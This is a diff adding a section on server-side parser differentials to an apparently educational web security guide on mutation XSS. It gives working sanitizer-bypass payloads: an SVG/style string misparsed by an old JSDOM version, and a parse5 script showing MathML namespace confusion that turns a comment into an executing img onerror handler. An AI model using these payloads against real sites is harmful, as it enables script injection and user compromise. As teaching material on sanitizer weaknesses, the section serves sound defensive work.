@@ -986,6 +986,37 @@ Also checkout this tool to identify unique features about different HTML sanitiz
 Identify HTML sanitizers and parsers interactively
 {% endembed %}
 
+#### Server-Side parser differentials
+
+Parsing HTML is hard, and if you're sanitizing content on the server before sending it to the client, there are often tiny differences in how the server vs. client sees the content.
+
+One [example from DOMPurify](https://github.com/cure53/DOMPurify?tab=readme-ov-file#running-dompurify-on-the-server) is the **JSDOM** dependency which needs to be up to date to be accurate. Version **19.0.0**, for example, would parse the following HTML wrongly ([source](https://www.ias.cs.tu-bs.de/publications/parsing_differentials.pdf)):
+
+```html
+<svg><style>&lt;img src=x onerror=alert(origin)&gt;<keygen>
+```
+
+Another example is the pattern where a library like [`parse5`](https://www.npmjs.com/package/parse5) serializes the inner content all children, but assumes these are all in the HTML namespace. If you inject a `<math>` tag in the root, it will parse as MathML to the server but then serialize the HTML without that context. This causes the browser to see it as regular HTML and turn into a namespace confusion exploitable using `<style>`:
+
+```javascript
+import * as parse5 from 'parse5';
+
+function parse(text) {
+    const fragment = parse5.parseFragment(`<div>${text}</div>`);
+    // Imagine sanitization here
+    console.log(fragment.childNodes[1].childNodes[0].childNodes[0]);
+    // {nodeName: '#comment', data: '</style><img src onerror=alert()></div>'}
+    return fragment.childNodes.map(node => parse5.serialize(node)).join('');
+}
+
+console.log(parse("</div><math><style><!--</style><img src onerror=alert()>"));
+```
+
+During parsing it is correctly seen as the MathML namespace and the `<!--` comment syntax prevents the style tag from closing. The payload is seen as a _comment_.\
+The result in the browser omits the `<div>` and `<math>` root-level tags, causing the XML comment not to be recognized and the `</style>` actually closes it, bringing the context back from CSS to HTML.
+
+<figure><img src="../../../.gitbook/assets/image (80).png" alt=""><figcaption><p>Parsed result of sanitization in the browser, executing payload</p></figcaption></figure>
+
 #### Resources
 
 * Easy-to-follow Google Search mXSS: [https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/](https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/)
